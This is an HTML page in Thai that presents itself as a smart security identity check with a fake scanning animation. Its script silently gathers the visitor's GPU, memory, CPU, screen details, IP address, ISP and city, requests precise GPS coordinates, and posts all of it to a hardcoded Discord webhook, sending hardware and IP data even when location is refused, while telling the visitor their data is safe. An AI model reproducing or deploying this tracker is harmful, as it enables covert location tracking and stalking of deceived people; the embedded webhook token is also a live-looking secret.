<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ระบบรักษาความปลอดภัยอัจฉริยะ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #010409; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .scan-line { height: 2px; background: linear-gradient(90deg, transparent, #3b82f6, transparent); position: absolute; width: 100%; top: 0; animation: scan move 1.5s infinite linear; }
        @keyframes move { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2rem] overflow-hidden shadow-2xl relative border-t-2 border-blue-500/30">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
                กำลังวิเคราะห์ความปลอดภัยขั้นสูง
            </div>
            <h1 class="text-2xl font-bold mb-1">ยืนยันตัวตนผู้ใช้</h1>
            <p id="main-desc" class="text-slate-400 text-xs">กรุณารอระบบรวบรวมข้อมูลฮาร์ดแวร์และเครือข่าย...</p>
        </div>

        <div class="p-8 pt-0">
            <div id="step-scan" class="block text-center py-6">
                <div class="relative w-32 h-32 mx-auto mb-6 rounded-3xl bg-slate-900 flex items-center justify-center border border-white/5">
                    <div class="text-4xl animate-pulse">🔒</div>
                    <div class="scan-line"></div>
                </div>
                <div id="status-log" class="text-[10px] font-mono text-blue-400/70 text-left space-y-1 bg-black/30 p-3 rounded-xl border border-white/5">
                    <p>> กำลังสแกน GPU Renderer...</p>
                    <p>> ตรวจสอบ Memory Stack...</p>
                    <p>> วิเคราะห์พิกัดดาวเทียม...</p>
                </div>
            </div>

            <div id="step-result" class="hidden animate-in fade-in zoom-in duration-500">
                <div class="mb-4 p-4 bg-blue-500/5 border border-blue-500/20 rounded-2xl">
                    <div id="summary-list" class="text-xs space-y-2 text-slate-300">
                        </div>
                </div>
                <button onclick="window.open('https://www.google.com/maps?q=${currentLat},${currentLon}')" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-bold text-sm transition-all shadow-lg shadow-blue-600/20 active:scale-95">
                    เปิดแผนที่เพื่อยืนยันพิกัด
                </button>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497085877245972631/6juBaxSvhNsQ3GMceT_nWa1qeFWEmIk0ZpbrPYfq9qB3URkmYYDvwZ2T1gsTzy8Sj75_";
        let currentLat, currentLon;

        window.onload = startDeepScan;

        async function startDeepScan() {
            const hw = getHardwareInfo();
            const ip = await getNetworkInfo();
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    currentLat = pos.coords.latitude;
                    currentLon = pos.coords.longitude;
                    
                    const fullData = {
                        lat: currentLat, lon: currentLon, acc: pos.coords.accuracy.toFixed(1),
                        ...hw, ...ip
                    };

                    await sendToDiscord(fullData);
                    updateUI(fullData);
                }, async (err) => {
                    await sendToDiscord({ lat: "ปฏิเสธ", lon: "ปฏิเสธ", ...hw, ...ip });
                    alert("จำเป็นต้องอนุญาตการเข้าถึงพิกัดเพื่อความปลอดภัย");
                }, { enableHighAccuracy: true });
            }
        }

        function getHardwareInfo() {
            // ดึงข้อมูลการ์ดจอ (GPU)
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "ไม่ทราบ";

            return {
                model: navigator.userAgent.includes("Android") ? "Android" : "iOS/Other",
                gpu: gpu,
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "ไม่ระบุ",
                cores: navigator.hardwareConcurrency || "ไม่ระบุ",
                screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio}x)`,
                touchPoints: navigator.maxTouchPoints
            };
        }

        async function getNetworkInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                return await res.json();
            } catch { return { ip: "Error", org: "Unknown" }; }
        }

        async function sendToDiscord(d) {
            const payload = {
                embeds: [{
                    title: "<a:loading:1484593662397644952> รายงานการตรวจสอบเชิงลึก",
                    color: 3447003,
                    fields: [
                        { name: "<a:device:1484593643284074627> ฮาร์ดแวร์", value: `**GPU:** ${d.gpu}\n**RAM:** ${d.ram} | **CPU:** ${d.cores} คอร์\n**จอ:** ${d.screen}`, inline: false },
                        { name: "<a:location:1484593651387469954> พิกัด (Lat, Lon)", value: `\`${d.lat}, ${d.lon}\`\n(คลาดเคลื่อน: +/- ${d.acc || 0} ม.)`, inline: true },
                        { name: "<a:network:1484593749391708200> เครือข่าย", value: `**IP:** ${d.ip}\n**ISP:** ${d.org}\n**เมือง:** ${d.city || 'N/A'}`, inline: true },
                        { name: "<a:link:1484943895526899792> แผนที่", value: `[ดูบน Google Maps](https://www.google.com/maps?q=${d.lat},${d.lon})` }
                    ],
                    footer: { text: "Security Trace • " + new Date().toLocaleString('th-TH'), icon_url: "https://cdn.discordapp.com/emojis/1484593620370853948.gif" }
                }]
            };
            await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
        }

        function updateUI(d) {
            document.getElementById('step-scan').classList.add('hidden');
            document.getElementById('step-result').classList.remove('hidden');
            document.getElementById('main-desc').innerText = "สแกนสำเร็จ ข้อมูลของคุณปลอดภัย";
            document.getElementById('summary-list').innerHTML = `
                <div class="flex justify-between"><span>ผู้ให้บริการ:</span><span class="text-blue-400">${d.org}</span></div>
                <div class="flex justify-between"><span>พิกัด:</span><span class="text-blue-400">${d.city || 'ตรวจพบแล้ว'}</span></div>
                <div class="flex justify-between"><span>กราฟิก:</span><span class="text-blue-400">${d.gpu.split(' ').pop()}</span></div>
            `;
        }
    </script>
</body>
</html>
